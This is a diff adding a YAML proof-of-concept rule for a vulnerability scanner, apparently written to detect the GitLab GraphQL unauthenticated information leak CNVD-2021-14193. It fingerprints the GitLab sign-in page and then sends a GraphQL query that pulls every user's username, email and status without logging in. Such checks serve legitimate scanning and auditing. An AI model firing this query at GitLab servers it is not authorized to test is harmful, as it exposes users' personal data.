@@ -1,0 +1,24 @@
+name: poc-yaml-gitlib-api-unauth
+rules:
+  - method: GET
+    path: "/users/sign_in"
+    follow_redirects: false
+    expression: 
+      response.body.bcontains(bytes(string('gitlab')))&&response.status == 200
+
+  - method: POST
+    path: "/api/graphql"
+    headers:
+      Content-Type: application/json
+    follow_redirects: false
+    body: |
+      {"query":"{users {edges {  node {    username    email    avatarUrl    status {      emoji      message      messageHtml     }    }   }  } }","variables":null,"operationName":null}
+    expression: 
+      r'users'.bmatches(response.body)&&r'email'.bmatches(response.body)&&r'username'.bmatches(response.body)&&response.status == 200
+
+detail:
+  author: tangshoupu
+  info: GitLab_api.graphql未授权信息泄露(CNVD-2021-14193)
+  links: https://www.cnvd.org.cn/flaw/show/CNVD-2021-14193
+
+    
